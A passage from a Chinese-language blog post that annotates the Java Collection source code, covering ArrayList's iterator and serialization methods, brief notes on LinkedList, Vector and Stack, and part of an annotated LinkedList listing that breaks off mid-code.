class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Itr();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * An optimized version of AbstractList.Itr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cursor;       <span class="comment">// index of next element to return //默认是0</span></span><br><span class="line">    <span class="keyword">int</span> lastRet = -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such  //上一次返回的元素 (删除的标志位)</span></span><br><span class="line">    <span class="keyword">int</span> expectedModCount = modCount; <span class="comment">//用于判断集合是否修改过结构的 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cursor != size;<span class="comment">//游标是否移动至尾部</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        checkForComodification();</span><br><span class="line">        <span class="keyword">int</span> i = cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size)<span class="comment">//判断是否越界</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length)<span class="comment">//再次判断是否越界，在 我们这里的操作时，有异步线程修改了List</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        cursor = i + <span class="number">1</span>;<span class="comment">//游标+1</span></span><br><span class="line">        <span class="keyword">return</span> (E) elementData[lastRet = i];<span class="comment">//返回元素 ，并设置上一次返回的元素的下标</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;<span class="comment">//remove 掉 上一次next的元素</span></span><br><span class="line">        <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)<span class="comment">//先判断是否next过</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">        checkForComodification();<span class="comment">//判断是否修改过</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ArrayList.<span class="keyword">this</span>.remove(lastRet);<span class="comment">//删除元素 remove方法内会修改 modCount 所以后面要更新Iterator里的这个标志值</span></span><br><span class="line">            cursor = lastRet; <span class="comment">//要删除的游标</span></span><br><span class="line">            lastRet = -<span class="number">1</span>; <span class="comment">//不能重复删除 所以修改删除的标志位</span></span><br><span class="line">            expectedModCount = modCount;<span class="comment">//更新 判断集合是否修改的标志，</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//判断是否修改过了List的结构，如果有修改，抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>ArrayList 的序列化没有直接序列化 elementData，而是根据 size 序列化包含的元素，忽略数组中的其它位置，提高效率并节省空间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException</span>&#123;</span><br><span class="line">    <span class="comment">// fail-fast，后续判断是否有并发处理</span></span><br><span class="line">    <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">    <span class="comment">// 序列化没有标记为 static、transient 的字段，包括 size 等。</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有意义，可以忽略</span></span><br><span class="line">    s.writeInt(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        s.writeObject(elementData[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">        <span class="comment">// ArrayList 被并发处理，发生结构性修改</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    elementData = EMPTY_ELEMENTDATA;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化没有标记为 static、transient 的字段，包括 size 等</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以忽略，跟 writeObject 里面的方法对应</span></span><br><span class="line">    s.readInt(); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 数组扩容</span></span><br><span class="line">        ensureCapacityInternal(size);</span><br><span class="line"></span><br><span class="line">        Object[] a = elementData;</span><br><span class="line">        <span class="comment">// 反序列化元素并填充到数组中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            a[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h3><p>LinkedList 继承自 AbstractSequentialList。AbstractSequentialList 又继承自AbstractList，并且基于 iterator 实现了默认增删改查操作。</p><p><img src="/2020/Java-Collection-sourcecode/LinkedList.jpg" alt="LinkedList"></p><p>文末附完整源码。</p><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>线程安全的 ArrayList。Vector 和 ArrayList 一样都继承自 AbstractList，除了 Vector 的方法上多了个 synchronized 外，代码都是一样的。效率相对会比较低。</p><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Stack 继承自Vector，也是一个线程安全的集合。基于数组实现栈结构集合。</p><p><img src="/2020/Java-Collection-sourcecode/Stack.jpg" alt="Stack"></p><p>LinkedList 完整源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractSequentialList</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">Deque</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList的元素个数：</span></span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList的头结点：Node内部类</span></span><br><span class="line">    <span class="keyword">transient</span> java.util.LinkedList.Node&lt;E&gt; first;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList尾结点：Node内部类</span></span><br><span class="line">    <span class="keyword">transient</span> java.util.LinkedList.Node&lt;E&gt; last;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//空实现：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用添加方法：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>();</span><br><span class="line">        addAll(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList添加首结点 first：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        linkFirst(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//first节点插入新元素：addFirst()调用</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">linkFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//头结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="comment">//创建一个新节点，并指向头结点f：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(<span class="keyword">null</span>, e, f);</span><br><span class="line">        <span class="comment">//将新节点赋值给头几点：</span></span><br><span class="line">        first = newNode;</span><br><span class="line">        <span class="comment">//如果头节点为null，则是第一个元素插入，将新节点也设置为尾结点；</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">            last = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//将之前的头结点的前指针指向新的结点：</span></span><br><span class="line">            f.prev = newNode;</span><br><span class="line">        <span class="comment">//长度+1</span></span><br><span class="line">        size++;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加元素：添加到最后一个结点；</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        linkLast(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加最后一个结点 last：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        linkLast(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last节点插入新元素：addLast()调用</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//将尾结点赋值个体L:</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="comment">//创建新的结点，将新节点的前指针指向l:</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//新节点置为尾结点：</span></span><br><span class="line">        last = newNode;</span><br><span class="line">        <span class="comment">//如果尾结点l为null：则是空集合新插入</span></span><br><span class="line">        <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">            <span class="comment">//头结点也置为 新节点：</span></span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//l节点的后指针指向新节点：</span></span><br><span class="line">            l.next = newNode;</span><br><span class="line">        <span class="comment">//长度+1</span></span><br><span class="line">        size++;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//向对应角标添加元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查传入的角标 是否正确：</span></span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        <span class="comment">//如果插入角标==集合长度，则插入到集合的最后面：</span></span><br><span class="line">        <span class="keyword">if</span> (index == size)</span><br><span class="line">            linkLast(element);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//插入到对应角标的位置：获取此角标下的元素先</span></span><br><span class="line">            linkBefore(element, node(index));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在succ前插入 新元素e：</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">linkBefore</span><span class="params">(E e, java.util.LinkedList.Node&lt;E&gt; succ)</span> </span>&#123;</span><br><span class="line">        <span 